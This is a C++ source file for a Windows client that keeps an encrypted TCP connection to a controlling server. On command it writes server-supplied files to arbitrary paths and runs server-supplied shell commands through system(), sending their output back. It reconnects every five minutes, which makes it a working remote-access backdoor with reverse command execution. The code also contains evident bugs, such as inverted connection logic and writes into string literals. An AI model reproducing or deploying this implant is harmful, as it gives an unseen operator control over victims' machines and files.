#define server_ip "127.0.0.1"
#define rotor_file R"(E:\RDEC\MyWorks\VS\C++\filereg\Release\ROTORSTD)"
#define cstring_key "123456789"

//const 全局变量尽量使用define

#include "tcp_client.h"
#include "EMSTD.h"
#include <Windows.h>
#include <iostream>
#pragma comment(lib,"EMSTD.lib")

class tcps_client :private tcp_client
{
private:
	EMSTD::MACHINE *_coder;
public:
	tcps_client(const char *ip, int port, const char *rotor, const char *key) :tcp_client(ip, port)
	{
		_coder = EMSTD::machine(rotor, key);
	}
	~tcps_client()
	{
		EMSTD::free(_coder);
	}
	int tcps_send(char *buf, int len)
	{
		for (int i = 0; i < len; ++i)
		{
			buf[i] = _coder->code(buf[i]);
		}
		return tcp_send(buf, len);
	}
	int tcps_recv(char *buf, int len)
	{
		int re;
		re = tcp_recv(buf, len);
		if (re != SOCKET_ERROR)
		{
			for (int i = 0; i < len; ++i)
			{
				buf[i] = _coder->code(buf[i]);
			}
		}
		return re;
	}
	bool valid()
	{
		if (connected) return false;
		else return true;
	}
};

tcps_client *HOST;
FILE *sout, *serr;

int s4()
{
	//接收存放路径
	char target_path[256];
	int i = 0;
	HOST->tcps_recv(target_path, 1);
	//while (target_path[i])
	//{
	//	++i;
	//	if (HOST->tcps_recv(&target_path[i], 1) == SOCKET_ERROR) return -2;
	//}
	HOST->tcps_recv(&target_path[i], 256);
	//接收文件大小
	int size = 0;
	if (HOST->tcps_recv((char*)&size, 4) == SOCKET_ERROR) return -2;
	//接收文件
	FILE *fp;
	if ((fp = fopen(target_path, "wb")) == NULL) return -3;
	char buffer[8192];
	for (long j = 0; j < size; j += i)
	{
		i = HOST->tcps_recv(buffer, (size - i > 8192) ? 8192 : size - i);
		if (i == SOCKET_ERROR) return -2;
		fwrite(buffer, i, 1, fp);
	}
	//结束传送
	fclose(fp);
	if (HOST->tcps_recv((char*)"\0", 1) == SOCKET_ERROR) return -1;
	return 0;
}

int s5()
{
	//输出重定向
	sout = freopen("sout", "w", stdout);
	serr = freopen("serr", "w", stderr);
	//接收命令行
	char buff[1024];
	int n;
	for (n = 0; n < 1024; ++n)
	{
		HOST->tcps_recv(&buff[n], 1);
		if (!buff[n]) break;
	}
	//执行命令行
	system(buff);
	//发送结果
	if (ftell(sout))
	{
		fclose(sout);
		sout = fopen("sout", "rb");
		while (n = fread(buff, 1, 1024, sout))
		{
			HOST->tcps_send(buff, n);
		}
	}
	if (ftell(serr))
	{
		fclose(serr);
		serr = fopen("serr", "rb");
		while (n = fread(buff, 1, 1024, serr))
		{
			HOST->tcps_send(buff, n);
		}
	}
	HOST->tcps_recv((char *)"\0", 1);
	//发送结束标志
	HOST->tcps_recv((char *)"\0", 1);
	//清空文件
	fclose(fopen("sout", "w"));
	fclose(fopen("serr", "w"));
	return 0;
}

int main()
{
	//winsock 初始化
	WSADATA wsd;
	WSAStartup(MAKEWORD(2, 2), &wsd);
	//建立连接伺服
	HOST = new tcps_client(server_ip, 6459, rotor_file, cstring_key);
	while (true)
	{
		if (HOST->valid())
		{
			char cmd[3];
			while (HOST->tcps_recv(cmd, 3) != SOCKET_ERROR)
			{
				int failed = 0;
				if (!strcmp(cmd, "s4"))
				{
					failed = s4();
				}
				else if (!strcmp(cmd, "s5"))
				{
					failed = s5();
				}
				if (failed)
				{
					break;
				}
			}
		}
		std::cout << WSAGetLastError() << std::endl;
		delete HOST;
		HOST = new tcps_client(server_ip, 6459, rotor_file, cstring_key);
		if (HOST->valid()) continue;
		Sleep(300000);
	}
}
